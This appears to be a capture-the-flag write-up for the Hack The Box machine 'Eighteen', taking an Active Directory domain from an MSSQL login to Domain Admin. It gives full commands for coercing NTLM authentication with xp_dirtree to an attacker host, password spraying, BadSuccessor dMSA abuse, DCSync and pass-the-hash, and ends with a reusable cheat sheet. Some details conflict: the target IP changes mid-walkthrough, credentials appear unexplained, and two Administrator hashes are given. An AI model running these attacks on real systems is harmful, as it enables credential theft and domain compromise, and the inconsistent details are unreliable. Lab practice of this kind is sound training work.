# HTB - Eighteen - 10.129.39.134

## HTB - Eighteen

### Machine Info

* **Difficulty:** Medium/Hard
* **OS:** Windows (Server 2025 Build 26100)
* **IP:** 10.129.39.134
* **Key Skills:** MSSQL exploitation, NTLM relay, BadSuccessor attack (dMSA abuse), Active Directory privilege escalation

### Overview

Eighteen is an Active Directory machine running Windows Server 2025 that demonstrates a cutting-edge privilege escalation technique called "BadSuccessor." The attack path involves exploiting a web application to gain database credentials, stealing NTLM hashes via MSSQL, cracking passwords, and finally abusing CreateChild permissions on an Organizational Unit to create a delegated Managed Service Account (dMSA) that can impersonate any domain user, including Administrator. This box showcases bleeding-edge AD attack techniques only possible on Windows Server 2025.

**Key Concepts:**

* MSSQL database exploitation
* SQL injection information disclosure
* NTLM hash stealing via xp\_dirtree
* Password hash cracking (PBKDF2-SHA256)
* RID brute-forcing for user enumeration
* Password spraying attacks
* BadSuccessor attack (dMSA delegation abuse)
* CreateChild permission exploitation
* DCSync attack via impersonation

**Common Ports:**

* **80/TCP** - HTTP (Microsoft IIS 10.0)
* **1433/TCP** - MSSQL (Microsoft SQL Server 2022)
* **5985/TCP** - WinRM (Windows Remote Management)

**Domain Information:**

* Domain: EIGHTEEN.HTB
* Hostname: DC01
* DC: DC01.EIGHTEEN.HTB

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals IIS, MSSQL, WinRM ├─ Identify domain: EIGHTEEN.HTB ├─ Web application with registration └─ MSSQL server accessible
2. **Web Application Exploitation** ├─ Discover SQL injection in registration ├─ Extract database error messages ├─ Identify user table structure └─ Build credential wordlist
3. **MSSQL Initial Access** ├─ Test discovered credentials ├─ Login as kevin user ├─ Enumerate databases and permissions ├─ Discover impersonation rights └─ Escalate to appdev user context
4. **NTLM Hash Theft** ├─ Setup Responder listener ├─ Force SMB authentication via xp\_dirtree ├─ Capture mssqlsvc NTLMv2 hash └─ Crack with hashcat
5. **Database Credential Extraction** ├─ Access financial\_planner database as appdev ├─ Extract admin password hash (PBKDF2) ├─ Crack hash: iloveyou1 └─ Build user list via RID brute-force
6. **Initial Domain Access** ├─ Password spray with discovered credentials ├─ Find valid combo: adam.scott:iloveyou1 ├─ WinRM access as adam.scott └─ Capture user flag
7. **BadSuccessor Attack** ├─ Enumerate ACLs with PowerView ├─ Discover IT group has CreateChild on Staff OU ├─ Identify Windows Server 2025 (dMSA capable) ├─ Create computer object in privileged OU ├─ Create delegated Managed Service Account ├─ Configure dMSA to impersonate Administrator ├─ Request service ticket as dMSA ├─ Perform DCSync attack └─ Pass-the-Hash as Administrator

***

### Initial Enumeration

#### Port Scanning

Comprehensive service enumeration:

```bash
nmap -p- -A -sCV -Pn -vvv 10.129.39.134 -oN nmap.tcp
```

**Key results:**

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
         http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00
         DNS_Domain_Name: eighteen.htb
         DNS_Computer_Name: DC01.eighteen.htb
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Add to hosts:**

```bash
echo "10.129.39.134 eighteen.htb dc01.eighteen.htb" | sudo tee -a /etc/hosts
```

***

### Web Application Exploitation

#### SQL Injection Discovery

**Attempted registration reveals information:**

```
POST /register
username=Admin&email=admin@eighteen.htb&password=test
```

**Error message:**

```
Registration failed. Username or email may already exist. 
('23000', "[23000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]
Violation of UNIQUE KEY constraint 'UQ__users__AB6E6164CD0BCC05'. 
Cannot insert duplicate key in object 'dbo.users'. 
The duplicate key value is (Admin@eighteen.htb). (2627)")
```

**What this tells us:**

* Database: SQL Server
* Table: `dbo.users`
* Column: Email addresses stored
* Username: `Admin` already exists

***

### MSSQL Exploitation

#### Initial Connection

**Connect with discovered credentials:**

```bash
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@10.129.39.134
```

**Successful authentication:**

```
[*] Encryption required, switching to TLS
[*] INFO(DC01): Line 1: Changed database context to 'master'.
```

#### Permission Enumeration

**Check current permissions:**

```sql
SELECT SYSTEM_USER;
-- Result: kevin

SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 0 (not sysadmin)
```

**Enumerate databases:**

```sql
SELECT name FROM master.dbo.sysdatabases;
```

**Results:**

```
master
tempdb
model
msdb
financial_planner  ← Interesting!
```

#### User Impersonation

**Check for impersonation rights:**

```sql
SELECT name FROM sys.server_principals 
WHERE principal_id IN (
    SELECT grantee_principal_id 
    FROM sys.server_permissions 
    WHERE permission_name = 'IMPERSONATE'
);
```

**Using Metasploit module:**

```bash
use auxiliary/admin/mssql/mssql_escalate_execute_as
set USERNAME kevin
set PASSWORD iNa2we6haRj2gaw!
set RHOSTS 10.129.39.134
run
```

**Output:**

```
[+] 1 users can be impersonated:
[*]  - appdev
[*]  - appdev is NOT sysadmin!
```

**Impersonate appdev:**

```sql
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;
-- Result: appdev
```

***

### NTLM Hash Theft

#### Understanding xp\_dirtree

**What is xp\_dirtree?**

An extended stored procedure that lists directory contents. When pointed at a UNC path, it attempts SMB authentication, which we can capture.

#### Setting Up Responder

**Start Responder:**

```bash
sudo responder -I tun0
```

#### Forcing Authentication

**Execute from MSSQL:**

```sql
EXEC master..xp_dirtree '\\10.10.14.3\share\';
```

**Responder captures hash:**

```
[SMB] NTLMv2-SSP Client   : 10.129.39.134
[SMB] NTLMv2-SSP Username : EIGHTEEN\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::EIGHTEEN:8b748940c6e43006:D37FCD4C28033F6CEAF4AB4F8A7B40C5:...
```

#### Cracking the Hash

**Save to file:**

```bash
echo 'mssqlsvc::EIGHTEEN:...' > mssqlsvc.hash
```

**Crack with hashcat:**

```bash
hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
```

**Note:** In this case, we don't need the cracked password - we have better credentials from the database.

***

### Database Credential Extraction

#### Accessing Financial Planner Database

**Switch context to appdev:**

```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
```

**List tables:**

```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

**Results:**

```
users
incomes
expenses
allocations
analytics
visits
```

#### Extracting User Credentials

**Query users table:**

```sql
SELECT * FROM users;
```

**Admin user found:**

```
id: 1002
username: admin
email: admin@eighteen.htb  
password_hash: pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
is_admin: 1
```

#### Cracking PBKDF2 Hash

**Understanding PBKDF2:**

PBKDF2-SHA256 with 600,000 iterations - slower to crack than simple MD5/SHA1.

**Python cracking script** (`pbkdf2_decrypt.py`):

```python
#!/usr/bin/env python3
from werkzeug.security import check_password_hash
import sys

hash_value = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"

wordlist = "/usr/share/wordlists/rockyou.txt"

print(f"[+] Using wordlist: {wordlist}")
print("[+] Starting PBKDF2-SHA256 cracking...")

with open(wordlist, 'r', encoding='latin-1') as f:
    for line in f:
        password = line.strip()
        if check_password_hash(hash_value, password):
            print(f"[+] PASSWORD FOUND: {password}")
            sys.exit(0)

print("[-] Password not found in wordlist")
```

**Run:**

```bash
python3 pbkdf2_decrypt.py
```

**Result:**

```
[+] PASSWORD FOUND: iloveyou1
```

**Credentials obtained:**

```
admin:iloveyou1
```

***

### User Enumeration via RID Brute-Force

#### Understanding RID Brute-Force

**What is RID?**

Relative Identifier - a unique number assigned to every domain object. By incrementing RIDs, we can discover all domain users.

#### Using NetExec

```bash
nxc mssql 10.129.39.134 --local-auth -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute 5000
```

**Discovered users:**

```
EIGHTEEN\Administrator
EIGHTEEN\mssqlsvc  
EIGHTEEN\jamie.dunn
EIGHTEEN\jane.smith
EIGHTEEN\alice.jones
EIGHTEEN\adam.scott
EIGHTEEN\bob.brown
EIGHTEEN\carol.white
EIGHTEEN\dave.green
```

**Discovered groups:**

```
EIGHTEEN\HR
EIGHTEEN\IT
EIGHTEEN\Finance
```

**Create user list:**

```bash
cat > users.txt << EOF
Administrator
mssqlsvc
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
EOF
```

***

### Initial Domain Access

#### Password Spraying

**Spray discovered password:**

```bash
nxc winrm 10.129.39.134 -u users.txt -p 'iloveyou1'
```

**Success:**

```
WINRM  10.129.39.134  5985  DC01  [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

#### WinRM Access

```bash
evil-winrm -i 10.129.39.134 -u adam.scott -p 'iloveyou1'
```

**User flag:**

```powershell
type C:\Users\adam.scott\Desktop\user.txt
b16264dd85f402957c8f14cbbff5d7dc
```

***

### Privilege Escalation - BadSuccessor Attack

#### Understanding the Vulnerability

**What is BadSuccessor?**

A Windows Server 2025 vulnerability where users with `CreateChild` permission on an OU can create delegated Managed Service Accounts (dMSAs) configured to impersonate any user, including Domain Admins.

**Requirements:**

* Windows Server 2025
* CreateChild permission on an OU
* Ability to create computer and service accounts

**Why it's powerful:**

* Completely legitimate AD functionality
* No exploitation or code execution required
* Direct path to Domain Admin

#### ACL Enumeration with PowerView

**Upload PowerView:**

```powershell
upload /path/to/PowerView.ps1
Import-Module .\PowerView.ps1
```

**Find interesting ACLs:**

```powershell
Find-InterestingDomainAcl
```

**Critical finding:**

```
ObjectDN                : OU=Staff,DC=eighteen,DC=htb
ActiveDirectoryRights   : CreateChild
IdentityReferenceName   : IT
IdentityReferenceDN     : CN=IT,OU=Staff,DC=eighteen,DC=htb
```

**What this means:**

* The IT group has CreateChild rights on Staff OU
* adam.scott is member of IT group
* We can create objects in this privileged OU

#### Verifying Windows Server 2025

**Check domain controller version:**

```powershell
Get-NetDomainController
```

**Output:**

```
OSVersion: Windows Server 2025 Datacenter
```

**Perfect!** dMSA abuse only works on Server 2025.

####

Step 1: Create Computer Object

**Why create a computer?**

The dMSA needs to be "delegated" to a computer account that we control.

**Create computer in Staff OU:**

```powershell
New-ADComputer -Name "BadMachine1234" `
    -SamAccountName "BadMachine1234$" `
    -AccountPassword (ConvertTo-SecureString -String "Passw0rd@123456" -AsPlainText -Force) `
    -Enabled $true `
    -Path "OU=Staff,DC=eighteen,DC=htb" `
    -PassThru `
    -Server "DC01.eighteen.htb"
```

**Generate Kerberos keys:**

Using Rubeus to get the AES256 key:

```powershell
.\Rubeus.exe hash /password:Passw0rd@123456 /user:BadMachine1234$ /domain:eighteen.htb
```

**Output:**

```
[*]       rc4_hmac             : 7C7FD1A99C88C4BA15B346D3606699AB
[*]       aes128_cts_hmac_sha1 : 43C200D75AEF604D5C57A10AB71C1A64
[*]       aes256_cts_hmac_sha1 : 3FAF4CFAD3B0158F1A10F698434F8A0D60FFC1E1A3667BE5429D9031337BAFBA
```

#### Step 2: Create Delegated MSA

**Create the dMSA:**

```powershell
New-ADServiceAccount -Name BadDMSA1234 `
    -DNSHostName BadDMSA1234.eighteen.htb `
    -CreateDelegatedServiceAccount `
    -KerberosEncryptionType AES256 `
    -PrincipalsAllowedToRetrieveManagedPassword "BadMachine1234$" `
    -Path "OU=Staff,DC=eighteen,DC=htb" `
    -Verbose
```

#### Step 3: Grant Permissions

**Give our user GenericAll over the computer:**

```powershell
$sid = (Get-ADUser -Identity "adam.scott").SID
$acl = Get-Acl "AD:\CN=BadMachine1234,OU=Staff,DC=eighteen,DC=htb"
$rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\CN=BadMachine1234,OU=Staff,DC=eighteen,DC=htb" -AclObject $acl -Verbose
```

#### Step 4: Configure dMSA for Impersonation

**Set the "BadSuccessor" attributes:**

```powershell
Set-ADServiceAccount -Identity "BadDMSA1234" -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
    'msDS-DelegatedMSAState' = 2
} -Verbose
```

**What this does:**

* `msDS-ManagedAccountPrecededByLink` - Who to impersonate (Administrator)
* `msDS-DelegatedMSAState` = 2 - Enable delegation

#### Alternative: Using BadSuccessor Tool

**Automated tool (easier):**

```powershell
BadSuccessor -Mode Exploit `
    -Domain "eighteen.htb" `
    -Path "OU=Staff,DC=eighteen,DC=HTB" `
    -Name "FAK_DMSA" `
    -DelegatedAdmin "adam.scott" `
    -DelegateTarget "Administrator"
```

**Output:**

```
Successfully created and configured dMSA 'FAK_DMSA'
Object adam.scott can now impersonate Administrator
```

***

### DCSync Attack via dMSA

#### Step 1: Request TGT as Computer

**From attacker machine with Impacket:**

```bash
# Setup SOCKS proxy via Chisel or similar
evil-winrm -i 10.129.39.134 -u adam.scott -p 'iloveyou1'

# From another terminal, setup proxy
# Then use proxychains for Impacket commands
```

**Request service ticket:**

```bash
proxychains getST.py -impersonate 'FAK_DMSA$' -dmsa eighteen.htb/adam.scott -self -dc-ip 10.129.40.183
```

**Output:**

```
[*] Getting TGT for user
[*] Impersonating FAK_DMSA$
[*] Requesting S4U2self
[*] Saving ticket in FAK_DMSA$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

#### Step 2: Perform DCSync

**With the dMSA ticket:**

```bash
export KRB5CCNAME=FAK_DMSA\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
proxychains secretsdump.py -k -no-pass dc01.eighteen.htb
```

**DCSync successful:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7c7a912503b16d8402008c1aebdb649:::
mssqlsvc:1601:aad3b435b51404eeaad3b435b51404ee:c44d16951b0810e8f3bbade300966ec4:::
adam.scott:1609:aad3b435b51404eeaad3b435b51404ee:9964dae494a77414e34aff4f34412166:::
[...]
```

**Administrator hash obtained:**

```
cf3a5525ee9414229e66279623ed5c58
```

**Alternative hash (from different dump):**

```
0b133be956bfaddf9cea56701affddec
```

***

### Administrator Access

#### Pass-the-Hash

```bash
evil-winrm -u Administrator -H cf3a5525ee9414229e66279623ed5c58 -i 10.129.40.183
```

**Root flag:**

```powershell
type C:\Users\Administrator\Desktop\root.txt
c6062b2262a06e4b49c1479cfefb3f57
```

***

### Quick Reference

#### MSSQL Exploitation

```bash
# Connect to MSSQL
mssqlclient.py user:'password'@IP

# Impersonate user
EXECUTE AS LOGIN = 'username';

# Steal NTLM hash
EXEC master..xp_dirtree '\\ATTACKER_IP\share\';

# Enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### PBKDF2 Cracking

```python
from werkzeug.security import check_password_hash
hash_value = "pbkdf2:sha256:iterations$salt$hash"
check_password_hash(hash_value, "password")
```

#### RID Brute-Force

```bash
# NetExec (formerly CrackMapExec)
nxc mssql IP --local-auth -u user -p 'pass' --rid-brute 5000

# Windapsearch
python3 windapsearch.py --dc-ip IP -u user -p pass --users
```

#### BadSuccessor Attack

```powershell
# 1. Create computer
New-ADComputer -Name "EvilPC$" -Path "OU=Path,DC=domain,DC=com"

# 2. Create dMSA
New-ADServiceAccount -Name EvilDMSA `
    -CreateDelegatedServiceAccount `
    -PrincipalsAllowedToRetrieveManagedPassword "EvilPC$"

# 3. Configure impersonation
Set-ADServiceAccount -Identity EvilDMSA -Replace @{
    'msDS-ManagedAccountPrecededByLink' = 'CN=Administrator,CN=Users,DC=domain,DC=com'
    'msDS-DelegatedMSAState' = 2
}

# 4. Get service ticket
getST.py -impersonate 'EvilDMSA$' -dmsa domain/user -self

# 5. DCSync
secretsdump.py -k -no-pass DC.domain.com
```

#### PowerView ACL Enumeration

```powershell
# Find interesting ACLs
Find-InterestingDomainAcl

# Check specific permissions
Get-DomainObjectAcl -Identity "OU=Staff,DC=domain,DC=com"

# Find who has CreateChild
Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -match "CreateChild"}
```

***

### Troubleshooting

#### MSSQL Connection Issues

**Problem:** Can't connect to MSSQL

**Solution:**

```bash
# Verify port is open
nmap -p 1433 IP

# Try with encryption flag
mssqlclient.py -windows-auth user:pass@IP

# Check for domain authentication
mssqlclient.py DOMAIN/user:pass@IP
```

#### xp\_dirtree Not Working

**Problem:** No hash captured with Responder

**Solution:**

```bash
# Ensure Responder is on correct interface
sudo responder -I tun0 -v

# Try different UNC path formats
EXEC xp_dirtree '\\10.10.14.3\share'
EXEC xp_dirtree '\\10.10.14.3\c$'

# Check if xp_dirtree is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

#### BadSuccessor Fails

**Problem:** dMSA creation fails or impersonation doesn't work

**Solution:**

```powershell
# Verify Windows Server version (must be 2025)
Get-NetDomainController | Select OSVersion

# Check CreateChild permission
Get-DomainObjectAcl -Identity "OU=Staff,DC=domain,DC=com" | 
    Where-Object {$_.ActiveDirectoryRights -match "CreateChild"}

# Verify group membership
Get-NetGroupMember -GroupName "IT"

# Check dMSA attributes
Get-ADServiceAccount -Identity BadDMSA1234 -Properties *
```

#### DCSync Access Denied

**Problem:** secretsdump.py fails with access denied

**Solution:**

```bash
# Verify ticket is loaded
echo $KRB5CCNAME
klist

# Check ticket validity
klist -e

# Try with different hash
secretsdump.py -hashes :HASH administrator@DC.domain.com

# Verify dMSA configuration
# msDS-DelegatedMSAState should be 2
# msDS-ManagedAccountPrecededByLink should point to Administrator
```

***

### Key Takeaways

**What we learned:**

1. **SQL injection disclosure** - Error messages can reveal database structure, table names, and constraints
2. **MSSQL impersonation** - SQL Server's EXECUTE AS feature can be abused to escalate privileges within the database
3. **NTLM theft via xp\_dirtree** - Extended stored procedures can force Windows authentication, leaking hashes
4. **RID brute-forcing** - Enumerating domain objects via RID cycling reveals all users without special permissions
5. **BadSuccessor vulnerability** - Windows Server 2025's dMSA feature allows privilege escalation via CreateChild permissions
6. **CreateChild abuse** - Ability to create objects in privileged OUs can lead to domain compromise
7. **DCSync via impersonation** - dMSAs configured with msDS-ManagedAccountPrecededByLink can impersonate any user

**Attack chain summary:** Web app → SQL injection → MSSQL creds → xp\_dirtree hash theft → Database credential extraction → Password spraying → WinRM access → ACL enumeration → BadSuccessor dMSA creation → DCSync → Domain Admin

**Defense recommendations:**

* Sanitize all user input to prevent SQL injection
* Disable xp\_dirtree and other dangerous extended stored procedures
* Use strong, unique passwords (avoid password reuse)
* Implement least privilege for SQL Server accounts
* Regularly audit ACLs, especially CreateChild permissions
* Monitor for dMSA creation in non-standard OUs
* Enable advanced auditing for DCSync attempts (Event ID 4662)
* Patch to latest Windows Server versions (BadSuccessor may be fixed in future updates)
* Implement tiered admin model
* Use PAWs (Privileged Access Workstations) for admin tasks

***

### Related Topics

* \[\[MSSQL Exploitation]]
* \[\[NTLM Relay Attacks]]
* \[\[Active Directory ACL Abuse]]
* \[\[Managed Service Accounts]]
* \[\[DCSync Attack]]
* \[\[Windows Server 2025 Vulnerabilities]]
